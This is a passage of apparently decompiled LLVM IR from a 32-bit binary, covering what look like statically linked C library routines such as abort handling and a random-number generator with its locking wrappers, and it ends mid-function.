dec_label_pc_8053514:                             ; preds = %dec_label_pc_80534d0, %dec_label_pc_80534af, %dec_label_pc_80534e3, %dec_label_pc_80533dc, %dec_label_pc_80534f4
  store i32 %v2_80533af, i32* @eax, align 4
  %v2_805351d = call i32 @function_805405a(i32 %v2_80533af, i32 1)
  store i32 %v2_805351d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053525

dec_label_pc_8053525:                             ; preds = %dec_label_pc_8053391, %dec_label_pc_8053514
  %.0 = phi i32 [ undef, %dec_label_pc_8053391 ], [ %v2_805351d, %dec_label_pc_8053514 ]
  store i32 %v0_8053394, i32* @ebx, align 4
  store i32 %v0_8053393, i32* @esi, align 4
  store i32 %v0_8053392, i32* @edi, align 4
  store i32 %v0_8053391, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80534f4, { 1, 0 }
  uselistorder i32 %v0_8053486, { 1, 0 }
  uselistorder i32 %v1_8053454, { 1, 0 }
  uselistorder i32 %v2_805344d, { 1, 0 }
  uselistorder i32 %v1_8053442, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053451, { 1, 0 }
  uselistorder i32 %v1_80533d5, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_80533cd, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80533c5, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8064be0.342 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8064c14.345 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8064c0c.343, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_8053525, { 1, 0 }
  uselistorder label %dec_label_pc_8053514, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80534d0, { 1, 0 }
  uselistorder label %dec_label_pc_80534af, { 1, 0 }
  uselistorder label %dec_label_pc_805347a, { 1, 0 }
  uselistorder label %dec_label_pc_8053472, { 1, 0 }
  uselistorder label %dec_label_pc_805343e, { 1, 0 }
}

define i32 @function_805352d(i32 %arg1) local_unnamed_addr {
dec_label_pc_805352d:
  %v0_805352d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805353a = call i32 @function_80531e9(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8064be0.342 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8064be0.342 to i32), i32* @edx, align 4
  %v0_8053547 = load i32, i32* @ebx, align 4
  store i32 %v0_8053547, i32* @eax, align 4
  store i32 %v0_805352d, i32* @ebx, align 4
  %v0_805354a = call i32 @function_805315c()
  ret i32 %v0_805354a

; uselistorder directives
  uselistorder i32 ()* @function_805315c, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8064be0.342 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @function_80531e9, { 0, 4, 1, 2, 3 }
  uselistorder i8* @global_var_8064be0.342, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @function_8053550() local_unnamed_addr {
dec_label_pc_8053550:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_805355c = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e788.362 to i32))
  %v12_8053566 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805356b

dec_label_pc_805356b:                             ; preds = %dec_label_pc_805356b.dec_label_pc_805356b_crit_edge, %dec_label_pc_8053550
  %v0_805356b = phi i32 [ %v12_8053566, %dec_label_pc_8053550 ], [ %v0_805356b.pre, %dec_label_pc_805356b.dec_label_pc_805356b_crit_edge ]
  %v1_805357619 = phi i32 [ 31, %dec_label_pc_8053550 ], [ %v1_8053576, %dec_label_pc_805356b.dec_label_pc_805356b_crit_edge ]
  %v2_805356b = mul i32 %v1_805357619, 4
  %v3_805356b = add i32 %v2_805356b, 152
  %v4_805356b = add i32 %v3_805356b, %v0_805356b
  %v5_805356b = inttoptr i32 %v4_805356b to i32*
  store i32 0, i32* %v5_805356b, align 4
  %v0_8053576.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053576 = add i32 %v0_8053576.pre, -1
  %v9_8053576 = icmp slt i32 %v1_8053576, 0
  store i32 %v1_8053576, i32* %eax.global-to-local, align 4
  %v1_8053577 = icmp eq i1 %v9_8053576, false
  br i1 %v1_8053577, label %dec_label_pc_805356b.dec_label_pc_805356b_crit_edge, label %dec_label_pc_8053579

dec_label_pc_805356b.dec_label_pc_805356b_crit_edge: ; preds = %dec_label_pc_805356b
  %v0_805356b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805356b

dec_label_pc_8053579:                             ; preds = %dec_label_pc_805356b
  %v0_8053579 = load i32, i32* @ebx, align 4
  %v2_805357d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805357d, i32* @ebx, align 4
  %v4_8053585 = call i32 @function_8052954(i32 %v2_805357d, i32 6, i32 %v0_8053579, i32 %v0_8053579)
  store i32 %v4_8053585, i32* %eax.global-to-local, align 4
  %v1_805358d = icmp eq i32 %v4_8053585, 0
  %v1_805358f = icmp eq i1 %v1_805358d, false
  br i1 %v1_805358f, label %dec_label_pc_805359f, label %dec_label_pc_8053591

dec_label_pc_8053591:                             ; preds = %dec_label_pc_8053579
  %v3_8053597 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8053597 = call i32 @function_8050e80(i32 1, %_TYPEDEF_sigset_t* %v3_8053597, i32 0)
  store i32 %v4_8053597, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805359f

dec_label_pc_805359f:                             ; preds = %dec_label_pc_8053579, %dec_label_pc_8053591
  %v2_80535d74 = phi i32 [ %v4_8053585, %dec_label_pc_8053579 ], [ %v4_8053597, %dec_label_pc_8053591 ]
  %v0_805359f = load i8, i8* @global_var_8064b00.363, align 256
  %v1_805359f = icmp eq i8 %v0_805359f, 0
  %v1_80535a6 = icmp eq i1 %v1_805359f, false
  br i1 %v1_80535a6, label %dec_label_pc_80535d7, label %dec_label_pc_80535a8

dec_label_pc_80535a8:                             ; preds = %dec_label_pc_805359f
  store i8 1, i8* @global_var_8064b00.363, align 256
  br label %dec_label_pc_80535af

dec_label_pc_80535af:                             ; preds = %dec_label_pc_8053616, %dec_label_pc_80535a8
  %v1_80535b7 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e788.362 to i32))
  store i32 %v1_80535b7, i32* %eax.global-to-local, align 4
  %v1_80535c3 = call i32 @function_8055ccc(i32 6)
  store i32 %v1_80535c3, i32* %eax.global-to-local, align 4
  %v1_80535cf = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e788.362 to i32))
  store i32 %v1_80535cf, i32* %eax.global-to-local, align 4
  %v0_80535d7.pre = load i8, i8* @global_var_8064b00.363, align 256
  br label %dec_label_pc_80535d7

dec_label_pc_80535d7:                             ; preds = %dec_label_pc_805359f, %dec_label_pc_80535af
  %v2_80535d7 = phi i32 [ %v2_80535d74, %dec_label_pc_805359f ], [ %v1_80535cf, %dec_label_pc_80535af ]
  %v0_80535d7 = phi i8 [ %v0_805359f, %dec_label_pc_805359f ], [ %v0_80535d7.pre, %dec_label_pc_80535af ]
  %v1_80535d7 = zext i8 %v0_80535d7 to i32
  %v3_80535d7 = and i32 %v2_80535d7, -256
  %v4_80535d7 = or i32 %v1_80535d7, %v3_80535d7
  store i32 %v4_80535d7, i32* %eax.global-to-local, align 4
  %v10_80535dc = icmp eq i8 %v0_80535d7, 1
  %v1_80535de = icmp eq i1 %v10_80535dc, false
  br i1 %v1_80535de, label %dec_label_pc_8053638, label %dec_label_pc_80535e0

dec_label_pc_80535e0:                             ; preds = %dec_label_pc_80535d7
  %v2_80535e8 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80535e8, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8064b00.363, align 256
  %v3_80535f4 = bitcast i32* %stack_var_-272 to i8*
  %v4_80535f4 = call i32 @function_8051e84(i8* %v3_80535f4, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805360b

dec_label_pc_805360b:                             ; preds = %dec_label_pc_805360b.dec_label_pc_805360b_crit_edge, %dec_label_pc_80535e0
  %v0_805360b = phi i32 [ %v12_8053566, %dec_label_pc_80535e0 ], [ %v0_805360b.pre, %dec_label_pc_805360b.dec_label_pc_805360b_crit_edge ]
  %v1_805361318 = phi i32 [ 31, %dec_label_pc_80535e0 ], [ %v1_8053613, %dec_label_pc_805360b.dec_label_pc_805360b_crit_edge ]
  %v2_805360b = mul i32 %v1_805361318, 4
  %v3_805360b = add i32 %v2_805360b, 16
  %v4_805360b = add i32 %v3_805360b, %v0_805360b
  %v5_805360b = inttoptr i32 %v4_805360b to i32*
  store i32 -1, i32* %v5_805360b, align 4
  %v0_8053613.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053613 = add i32 %v0_8053613.pre, -1
  %v9_8053613 = icmp slt i32 %v1_8053613, 0
  store i32 %v1_8053613, i32* %eax.global-to-local, align 4
  %v1_8053614 = icmp eq i1 %v9_8053613, false
  br i1 %v1_8053614, label %dec_label_pc_805360b.dec_label_pc_805360b_crit_edge, label %dec_label_pc_8053616

dec_label_pc_805360b.dec_label_pc_805360b_crit_edge: ; preds = %dec_label_pc_805360b
  %v0_805360b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805360b

dec_label_pc_8053616:                             ; preds = %dec_label_pc_805360b
  store i32 %v2_80535e8, i32* %eax.global-to-local, align 4
  %v4_805362b = call i32 @function_805429b(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805362b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535af

dec_label_pc_8053638:                             ; preds = %dec_label_pc_80535d7
  %v10_8053638 = icmp eq i8 %v0_80535d7, 2
  %v1_805363a = icmp eq i1 %v10_8053638, false
  br i1 %v1_805363a, label %dec_label_pc_8053644, label %dec_label_pc_805363c

dec_label_pc_805363c:                             ; preds = %dec_label_pc_8053638
  store i8 3, i8* @global_var_8064b00.363, align 256
  br label %dec_label_pc_8053644

dec_label_pc_8053644:                             ; preds = %dec_label_pc_8053638, %dec_label_pc_805363c
  %v0_8053644 = phi i8 [ %v0_80535d7, %dec_label_pc_8053638 ], [ 3, %dec_label_pc_805363c ]
  %v9_8053644 = icmp eq i8 %v0_8053644, 3
  %v1_805364b = icmp eq i1 %v9_8053644, false
  br i1 %v1_805364b, label %dec_label_pc_805365e, label %dec_label_pc_805364d

dec_label_pc_805364d:                             ; preds = %dec_label_pc_8053644
  store i8 4, i8* @global_var_8064b00.363, align 256
  %v1_8053659 = call i32 @function_8050ad4(i32 127)
  unreachable

dec_label_pc_805365e:                             ; preds = %dec_label_pc_8053644, %dec_label_pc_805365e
  br label %dec_label_pc_805365e

; uselistorder directives
  uselistorder i32 %v1_8053613, { 2, 1, 0 }
  uselistorder i8 %v0_80535d7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8053576, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 10, 14, 11, 13, 12, 0 }
  uselistorder i8 3, { 0, 2, 6, 4, 5, 3, 1 }
  uselistorder i32 (i32, i32*, i32)* @function_805429b, { 1, 0 }
  uselistorder i8* @global_var_8064b00.363, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @function_8050e80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805365e, { 1, 0 }
  uselistorder label %dec_label_pc_8053644, { 1, 0 }
  uselistorder label %dec_label_pc_80535d7, { 1, 0 }
  uselistorder label %dec_label_pc_805359f, { 1, 0 }
}

define i32 @function_8053664(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053664:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_805367a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805367a, i32* @ebx, align 4
  %v2_805367f = call i32 @function_805405a(i32 %v2_805367a, i32 134561879)
  %v1_805368b = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e7a0.364 to i32))
  %v2_8053692 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805369c = call i32 @function_8053845(i32* nonnull @global_var_805e7b8, i32 %v2_8053692)
  store i32 ptrtoint (i32* @global_var_805e7b8 to i32), i32* @eax, align 4
  %v2_80536a6 = call i32 @function_805405a(i32 %v2_805367a, i32 1)
  %v3_80536ab = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_80536ab
}

define i32 @function_80536b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80536b4:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_80536c5 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80536c5, i32* @eax, align 4
  %v2_80536ca = call i32 @function_805405a(i32 %v2_80536c5, i32 134561879)
  %v1_80536d6 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e7a0.364 to i32))
  %v0_80536db = load i32, i32* bitcast (i32** @global_var_805e7c0.367 to i32*), align 64
  store i32 %v0_80536db, i32* @ebx, align 4
  %v3_80536ec = call i32 @function_80537ac(i32 %arg1, i32* nonnull @global_var_805e7b8)
  %v2_80536f4 = icmp slt i32 %v3_80536ec, 0
  br i1 %v2_80536f4, label %dec_label_pc_80536fb, label %dec_label_pc_80536f8

dec_label_pc_80536f8:                             ; preds = %dec_label_pc_80536b4
  store i32 ptrtoint (i32** @global_var_805e7bc.368 to i32), i32* @esi, align 4
  br label %dec_label_pc_80536fb

dec_label_pc_80536fb:                             ; preds = %dec_label_pc_80536b4, %dec_label_pc_80536f8
  store i32 %v2_80536c5, i32* @eax, align 4
  %v2_8053704 = call i32 @function_805405a(i32 %v2_80536c5, i32 1)
  %v0_805370c = load i32, i32* @esi, align 4
  ret i32 %v0_805370c

; uselistorder directives
  uselistorder label %dec_label_pc_80536fb, { 1, 0 }
}

define i32 @function_8053711(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053711:
  %stack_var_-24 = alloca i32, align 4
  %v2_8053720 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053720, i32* @ebx, align 4
  %v2_8053725 = call i32 @function_805405a(i32 %v2_8053720, i32 134561879)
  %v1_8053731 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e7a0.364 to i32))
  store i32 ptrtoint (i32** @global_var_805e7bc.368 to i32), i32* @esi, align 4
  %v4_8053750 = inttoptr i32 %arg2 to i32*
  %v5_8053750 = call i32 @function_805393d(i32 %arg1, i32* %v4_8053750, i32 %arg3, i32 ptrtoint (i32* @global_var_805e7b8 to i32))
  store i32 %v5_8053750, i32* @eax, align 4
  %v2_805375b = call i32 @function_805405a(i32 %v2_8053720, i32 1)
  %v0_8053763 = load i32, i32* @esi, align 4
  ret i32 %v0_8053763
}

define i32 @function_8053768(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053768:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053768 = load i32, i32* @ebx, align 4
  store i32 %v0_8053768, i32* %stack_var_-4, align 4
  %v2_8053776 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053776, i32* @ebx, align 4
  %v2_805377b = call i32 @function_805405a(i32 %v2_8053776, i32 134561879)
  %v1_8053787 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e7a0.364 to i32))
  %v3_8053797 = call i32 @function_80538a3(i32 %arg1, i32* nonnull @global_var_805e7b8)
  store i32 ptrtoint (i32* @global_var_805e7b8 to i32), i32* @eax, align 4
  %v2_80537a1 = call i32 @function_805405a(i32 %v2_8053776, i32 1)
  %v2_80537a9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80537a9, i32* @ebx, align 4
  ret i32 %v2_80537a1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805e7b8 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_805e7b8, { 0, 1, 3, 2 }
}

define i32 @function_80537ac(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_80537ac:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_80537af = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_80537bb = add i32 %tmp3, 12
  %v2_80537bb = inttoptr i32 %v1_80537bb to i32*
  %v3_80537bb = load i32, i32* %v2_80537bb, align 4
  store i32 %v3_80537bb, i32* %ecx.global-to-local, align 4
  %v1_80537be = add i32 %arg1, 4
  store i32 %v1_80537be, i32* %esi.global-to-local, align 4
  %v1_80537c1 = add i32 %tmp3, 8
  %v2_80537c1 = inttoptr i32 %v1_80537c1 to i32*
  %v3_80537c1 = load i32, i32* %v2_80537c1, align 4
  %v1_80537c4 = icmp eq i32 %v3_80537bb, 0
  %v1_80537c6 = icmp eq i1 %v1_80537c4, false
  br i1 %v1_80537c6, label %dec_label_pc_80537d1, label %dec_label_pc_80537c8

dec_label_pc_80537c8:                             ; preds = %dec_label_pc_80537ac
  %v1_80537c8 = add i32 %v3_80537c1, -4
  %v2_80537c8 = inttoptr i32 %v1_80537c8 to i32*
  store i32 0, i32* %v2_80537c8, align 4
  br label %dec_label_pc_80537e1

dec_label_pc_80537d1:                             ; preds = %dec_label_pc_80537ac
  %v1_80537d1 = add i32 %tmp3, 4
  %v2_80537d1 = inttoptr i32 %v1_80537d1 to i32*
  %v3_80537d1 = load i32, i32* %v2_80537d1, align 4
  %v2_80537d4 = sub i32 %v3_80537d1, %v3_80537c1
  %v2_80537d6 = sdiv i32 %v2_80537d4, 4
  %v3_80537d9 = mul i32 %v2_80537d6, 5
  %v2_80537dc = add i32 %v3_80537d9, %v3_80537bb
  store i32 %v2_80537dc, i32* %eax.global-to-local, align 4
  %v2_80537de = add i32 %v3_80537c1, -4
  %v3_80537de = inttoptr i32 %v2_80537de to i32*
  store i32 %v2_80537dc, i32* %v3_80537de, align 4
  br label %dec_label_pc_80537e1

dec_label_pc_80537e1:                             ; preds = %dec_label_pc_80537c8, %dec_label_pc_80537d1
  %v0_80537e1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80537e1 = add i32 %v0_80537e1, -4
  %v2_80537e1 = inttoptr i32 %v1_80537e1 to i32*
  %v3_80537e1 = load i32, i32* %v2_80537e1, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_80537e9 = ashr i32 %v3_80537e1, 31
  %v2_80537ea = zext i32 %v3_80537e1 to i64
  %v4_80537ea = zext i32 %v1_80537e9 to i64
  %v5_80537ea = mul nuw i64 %v4_80537ea, 4294967296
  %v6_80537ea = or i64 %v5_80537ea, %v2_80537ea
  %v8_80537ea = sdiv i64 %v6_80537ea, 5
  %v9_80537ea = trunc i64 %v8_80537ea to i32
  store i32 %v9_80537ea, i32* %eax.global-to-local, align 4
  %v10_80537ea = srem i64 %v6_80537ea, 5
  %v11_80537ea = trunc i64 %v10_80537ea to i32
  %v6_80537ef = icmp ugt i32 %v11_80537ea, 4
  br i1 %v6_80537ef, label %dec_label_pc_805382f, label %dec_label_pc_80537f1

dec_label_pc_80537f1:                             ; preds = %dec_label_pc_80537e1
  %v1_80537f1 = mul i32 %v11_80537ea, 4
  %v2_80537f1 = add i32 %v1_80537f1, ptrtoint (i32* @global_var_805cd74.369 to i32)
  %v3_80537f1 = inttoptr i32 %v2_80537f1 to i32*
  %v4_80537f1 = load i32, i32* %v3_80537f1, align 4
  store i32 %v4_80537f1, i32* %ecx.global-to-local, align 4
  %v1_80537f8 = icmp eq i32 %v11_80537ea, 0
  %v2_80537fa = add i32 %v1_80537f1, ptrtoint (i32* @global_var_805cd60.370 to i32)
  %v3_80537fa = inttoptr i32 %v2_80537fa to i32*
  %v4_80537fa = load i32, i32* %v3_80537fa, align 4
  store i32 %v4_80537fa, i32* %ebp.global-to-local, align 4
  %v1_8053801 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053801 = add i32 %v1_8053801, 12
  %v3_8053801 = inttoptr i32 %v2_8053801 to i32*
  store i32 %v11_80537ea, i32* %v3_8053801, align 4
  %v0_8053804 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053804 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053804 = add i32 %v1_8053804, 16
  %v3_8053804 = inttoptr i32 %v2_8053804 to i32*
  store i32 %v0_8053804, i32* %v3_8053804, align 4
  %v0_8053807 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053807 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053807 = add i32 %v1_8053807, 20
  %v3_8053807 = inttoptr i32 %v2_8053807 to i32*
  store i32 %v0_8053807, i32* %v3_8053807, align 4
  br i1 %v1_80537f8, label %dec_label_pc_8053822, label %dec_label_pc_805380c

dec_label_pc_805380c:                             ; preds = %dec_label_pc_80537f1
  %v0_805380c = load i32, i32* %esi.global-to-local, align 4
  %v1_805380c = add i32 %v0_805380c, -4
  %v2_805380c = inttoptr i32 %v1_805380c to i32*
  %v3_805380c = load i32, i32* %v2_805380c, align 4
  %v1_805380f = ashr i32 %v3_805380c, 31
  %v0_8053810 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053810 = zext i32 %v3_805380c to i64
  %v4_8053810 = zext i32 %v1_805380f to i64
  %v5_8053810 = mul nuw i64 %v4_8053810, 4294967296
  %v6_8053810 = or i64 %v5_8053810, %v2_8053810
  %v7_8053810 = zext i32 %v0_8053810 to i64
  %v8_8053810 = sdiv i64 %v6_8053810, %v7_8053810
  %v9_8053810 = trunc i64 %v8_8053810 to i32
  %v2_8053812 = mul i32 %v9_8053810, 4
  %v3_8053812 = add i32 %v2_8053812, %v0_805380c
  %v1_8053815 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053815 = add i32 %v1_8053815, %v9_8053810
  store i32 %v2_8053815, i32* %eax.global-to-local, align 4
  %v1_8053817 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053817 = add i32 %v1_8053817, 4
  %v3_8053817 = inttoptr i32 %v2_8053817 to i32*
  store i32 %v3_8053812, i32* %v3_8053817, align 4
  %v0_805381a = load i32, i32* %eax.global-to-local, align 4
  %v1_805381a = ashr i32 %v0_805381a, 31
  %v0_805381b = load i32, i32* %ecx.global-to-local, align 4
  %v2_805381b = zext i32 %v0_805381a to i64
  %v4_805381b = zext i32 %v1_805381a to i64
  %v5_805381b = mul nuw i64 %v4_805381b, 4294967296
  %v6_805381b = or i64 %v5_805381b, %v2_805381b
  %v7_805381b = zext i32 %v0_805381b to i64
  %v8_805381b = sdiv i64 %v6_805381b, %v7_805381b
  %v9_805381b = trunc i64 %v8_805381b to i32
  store i32 %v9_805381b, i32* %eax.global-to-local, align 4
  %v10_805381b = srem i64 %v6_805381b, %v7_805381b
  %v11_805381b = trunc i64 %v10_805381b to i32
  %v0_805381d = load i32, i32* %esi.global-to-local, align 4
  %v2_805381d = mul i32 %v11_805381b, 4
  %v3_805381d = add i32 %v2_805381d, %v0_805381d
  %v1_8053820 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053820 = inttoptr i32 %v1_8053820 to i32*
  store i32 %v3_805381d, i32* %v2_8053820, align 4
  br label %dec_label_pc_8053822

dec_label_pc_8053822:                             ; preds = %dec_label_pc_80537f1, %dec_label_pc_805380c
  %v0_8053822 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053822 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053822 = mul i32 %v1_8053822, 4
  %v3_8053822 = add i32 %v2_8053822, %v0_8053822
  %v1_8053825 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053825 = add i32 %v1_8053825, 24
  %v3_8053825 = inttoptr i32 %v2_8053825 to i32*
  store i32 %v3_8053822, i32* %v3_8053825, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805382a = load i32, i32* %esi.global-to-local, align 4
  %v1_805382a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805382a = add i32 %v1_805382a, 8
  %v3_805382a = inttoptr i32 %v2_805382a to i32*
  store i32 %v0_805382a, i32* %v3_805382a, align 4
  %v0_8053844.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805383d

dec_label_pc_805382f:                             ; preds = %dec_label_pc_80537e1
  %v1_805382f = call i32 @function_8050f90(i32 %v0_80537af)
  %v1_8053834 = inttoptr i32 %v1_805382f to i32*
  store i32 22, i32* %v1_8053834, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805383d

dec_label_pc_805383d:                             ; preds = %dec_label_pc_8053822, %dec_label_pc_805382f
  %v0_8053844 = phi i32 [ %v0_8053844.pre, %dec_label_pc_8053822 ], [ -1, %dec_label_pc_805382f ]
  store i32 %v0_80537af, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053844

; uselistorder directives
  uselistorder i32 %v11_80537ea, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805383d, { 1, 0 }
  uselistorder label %dec_label_pc_8053822, { 1, 0 }
  uselistorder label %dec_label_pc_80537e1, { 1, 0 }
}

define i32 @function_8053845(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053845:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8053848 = load i32, i32* @ebx, align 4
  store i32 %v0_8053848, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8053851 = add i32 %tmp3, 12
  %v2_8053851 = inttoptr i32 %v1_8053851 to i32*
  %v3_8053851 = load i32, i32* %v2_8053851, align 4
  %v4_8053851 = icmp eq i32 %v3_8053851, 0
  %v1_8053855 = add i32 %tmp3, 8
  %v2_8053855 = inttoptr i32 %v1_8053855 to i32*
  %v3_8053855 = load i32, i32* %v2_8053855, align 4
  store i32 %v3_8053855, i32* %esi.global-to-local, align 4
  %v1_8053858 = icmp eq i1 %v4_8053851, false
  br i1 %v1_8053858, label %dec_label_pc_8053871, label %dec_label_pc_805385a

dec_label_pc_805385a:                             ; preds = %dec_label_pc_8053845
  %v2_805385a = inttoptr i32 %v3_8053855 to i32*
  %v3_805385a = load i32, i32* %v2_805385a, align 4
  %v5_805385a = mul i32 %v3_805385a, 1103515245
  %v1_8053860 = add i32 %v5_805385a, 12345
  %v1_8053865 = urem i32 %v1_8053860, -2147483648
  store i32 %v1_8053865, i32* %eax.global-to-local, align 4
  store i32 %v1_8053865, i32* %v2_805385a, align 4
  %v0_805386c = load i32, i32* %eax.global-to-local, align 4
  %v1_805386c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805386c = inttoptr i32 %v1_805386c to i32*
  store i32 %v0_805386c, i32* %v2_805386c, align 4
  br label %dec_label_pc_805389c

dec_label_pc_8053871:                             ; preds = %dec_label_pc_8053845
  %v1_8053871 = add i32 %tmp3, 4
  %v2_8053871 = inttoptr i32 %v1_8053871 to i32*
  %v3_8053871 = load i32, i32* %v2_8053871, align 4
  store i32 %v3_8053871, i32* %ecx.global-to-local, align 4
  %v2_8053874 = load i32, i32* %arg1, align 4
  store i32 %v2_8053874, i32* %edx.global-to-local, align 4
  %v1_8053876 = add i32 %tmp3, 24
  %v2_8053876 = inttoptr i32 %v1_8053876 to i32*
  %v3_8053876 = load i32, i32* %v2_8053876, align 4
  store i32 %v3_8053876, i32* %edi.global-to-local, align 4
  %v1_8053879 = inttoptr i32 %v3_8053871 to i32*
  %v2_8053879 = load i32, i32* %v1_8053879, align 4
  store i32 %v2_8053879, i32* %eax.global-to-local, align 4
  %v1_805387b = inttoptr i32 %v2_8053874 to i32*
  %v2_805387b = load i32, i32* %v1_805387b, align 4
  %v4_805387b = add i32 %v2_805387b, %v2_8053879
  store i32 %v4_805387b, i32* %v1_805387b, align 4
  %v0_805387d = load i32, i32* %edx.global-to-local, align 4
  %v1_805387d = inttoptr i32 %v0_805387d to i32*
  %v2_805387d = load i32, i32* %v1_805387d, align 4
  %v1_805387f = add i32 %v0_805387d, 4
  store i32 %v1_805387f, i32* %edx.global-to-local, align 4
  %v2_8053882 = udiv i32 %v2_805387d, 2
